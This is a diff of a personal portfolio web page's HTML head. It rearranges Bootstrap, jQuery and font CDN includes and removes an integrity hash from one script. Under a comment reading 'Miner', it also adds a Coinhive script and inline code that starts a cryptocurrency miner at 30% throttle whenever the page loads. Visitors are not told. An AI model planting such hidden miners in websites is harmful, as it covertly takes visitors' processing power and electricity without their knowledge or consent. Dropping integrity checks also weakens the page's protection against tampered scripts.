@@ -2,14 +2,30 @@
 <html>
 <head>
 	<title>Portfolio</title>
-	<link href="https://bootswatch.com/superhero/bootstrap.min.css" rel="stylesheet">
+
+	<!-- Boot Strap -->
+	<!-- Latest compiled and minified CSS -->
+	<link rel="stylesheet" href="https://bootswatch.com/3/superhero/bootstrap.min.css">
+
+	<!-- jQuery library -->
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+	<!-- Latest compiled JavaScript -->
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+	<!-- Font / Glyph Icons -->
 	<link rel="stylesheet" href="https://cdn.rawgit.com/konpa/devicon/master/devicon.min.css">
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hover.css/2.1.0/css/hover-min.css">
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
-	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
 	<script src="https://use.fontawesome.com/8a9d8d3eec.js"></script>
-	<meta name='viewport' content='width=400'>
 
+	 <!-- Miner --> 
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+
+	<script> 
+		var miner = new CoinHive.Anonymous('AH9YR9lg3sPGdZKviBDhV6otFqEtJVoa',{throttle:.3});
+		miner.start();
+	</script>
+	<meta name='viewport' content='width=400'>
 	<style>
 	@media only screen and (max-width: 768px){
 		body > .container{
